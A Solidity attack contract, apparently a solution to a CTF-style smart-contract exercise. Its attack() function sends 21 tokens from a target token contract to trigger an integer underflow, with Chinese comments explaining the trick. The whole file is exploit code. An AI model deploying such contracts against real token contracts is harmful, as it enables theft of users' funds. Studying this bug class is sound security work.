// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//pragma solidity ^0.6.0;
import "../../interfaces/IToken.sol";
contract TokenAttack {
    IToken public target;

    constructor(address _target) public {
        target = IToken(_target);
    }

    function attack() public {
        // 假设初始余额是 20
        // 这里传 21 -> 下溢
        target.transfer(msg.sender, 21);
    }

    function getBalance() public view returns (uint) {
        return target.balanceOf(address(this));
    }
}